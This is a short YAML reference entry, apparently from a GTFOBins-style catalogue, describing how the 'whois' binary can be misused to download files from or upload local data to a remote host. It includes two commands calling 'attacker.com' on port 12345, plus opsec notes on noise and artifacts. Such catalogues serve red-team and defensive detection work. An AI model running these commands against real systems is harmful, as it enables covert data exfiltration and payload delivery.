---
name: whois
capabilities:
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: whois -h attacker.com -p 12345 x
  notes: Received data has instances of the `\r` byte stripped.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: whois -h attacker.com -p 12345 DATA
  notes: Data is converted to lower case, and has a trailing `\r\n`.
references:
- https://gtfobins.github.io/gtfobins/whois/
tags: []
---
